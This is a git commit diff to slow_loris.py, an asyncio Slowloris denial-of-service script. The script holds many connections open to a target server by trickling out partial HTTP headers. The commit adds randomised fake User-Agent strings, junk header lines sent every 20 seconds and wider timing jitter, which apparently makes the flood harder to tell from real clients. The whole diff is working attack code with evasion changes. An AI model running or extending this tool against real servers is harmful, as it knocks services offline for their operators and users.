77ba88bfafe6d81233ceb2da106c72ef4f49d09e
wpbindt <wesselbindt@gmail.com>
2021-05-01 14:44:17 +0200

    Add fake user agent headers to the loris' requests

--- slow_loris.py
+++ slow_loris.py
@@ -5,32 +5,45 @@ import random
 from string import ascii_letters
 from typing import Callable, Generator
 
+from fake_useragent import UserAgent
+
 from utils import retry
 
 
 async def headers(
     random_sleep: Callable[[], float],
+    user_agent: UserAgent,
 ) -> Generator[bytes, None, None]:
+    await asyncio.sleep(abs(random_sleep()))
     yield 'GET /ip HTTP/1.1\r\n'.encode('ascii')
+    await asyncio.sleep(20)
+    yield ('User-Agent: ' + user_agent.random + '\r\n').encode('ascii')
     while True:
-        await asyncio.sleep(random_sleep())
-        yield random.choice(ascii_letters).encode('ascii')
+        await asyncio.sleep(20)
+        random_chars = random.sample(ascii_letters, random.randrange(3, 8))
+        yield (
+            ''.join(random_chars[:-1]) + ': ' + random_chars[-1] + '\r\n'
+        ).encode('ascii')
 
 
 @retry(on=ConnectionRefusedError, retries=3)
-async def slow_loris(address, random_sleep=lambda: 1.5):
+async def slow_loris(address, random_sleep, user_agent):
     print('Connected to server')
     _, server = await asyncio.open_connection(*address)
-    async for header in headers(random_sleep):
+    async for header in headers(random_sleep, user_agent):
         print(f'Sending "{header}" to server')
         server.write(header)
         await server.drain()
 
 
-async def main(address, loris_count):
+async def main(address, loris_count, user_agent):
     lorises = [
         asyncio.create_task(
-            slow_loris(address, partial(random.gauss, mu=20, sigma=2))
+            slow_loris(
+                address,
+                partial(random.gauss, mu=10, sigma=20),
+                user_agent,
+            )
         )
         for _ in range(loris_count)
     ]
@@ -50,5 +63,7 @@ if __name__ == '__main__':
     )
     args = parser.parse_args()
 
+    user_agent = UserAgent()
+
     address = (args.host, args.port)
-    asyncio.run(main(address, args.loris_count))
+    asyncio.run(main(address, args.loris_count, user_agent))
